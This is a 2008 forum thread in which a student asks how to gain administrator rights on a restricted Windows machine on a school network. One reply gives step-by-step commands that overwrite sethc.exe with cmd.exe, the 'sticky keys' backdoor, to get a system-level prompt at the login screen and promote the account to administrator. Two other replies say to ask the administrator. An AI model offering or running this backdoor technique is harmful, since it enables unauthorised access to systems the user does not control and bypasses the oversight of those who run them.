---
title: "Administrative access in windows"
date: 2008-10-16
forum: Other OS Talk
---

### Post by emobrad on 2008-10-16
I want to get administrative access from windows in which I have very little access. Is this at all possible from command prompt (which I has access to) or is there another long complicated way to do this. It's set up on a network for my school.

---

### Post by prshah on 2008-10-16
> **emobrad said:**
> I want to get administrative access from windows in which I have very little access. Is this at all possible from command prompt (which I has access to) or is there another long complicated way to do this. It's set up on a network for my school.

At your own risk / responsibility: (Works for XP)

At the (administrative) command prompt, give the commands ```
cd \windows\system32
copy sethc.exe sethcbak.exe
copy cmd.exe sethc.exe

```

Now, reboot, and at the "Welcome" screen, tap LEFT-SHIFT 5 times. You will get an administrative command prompt, from which you can give the commands ```
start usermgmt.msc
``` and change your user from "limited" to "administrative".

---

### Post by forger on 2008-10-16
..you ask your administrator to grant them to you?

---

### Post by dmizer on 2008-10-16
> **forger said:**
> ..you ask your administrator to grant them to you?

This is indeed the correct way to get necessary access to any machine on which you are only given restricted access.

---

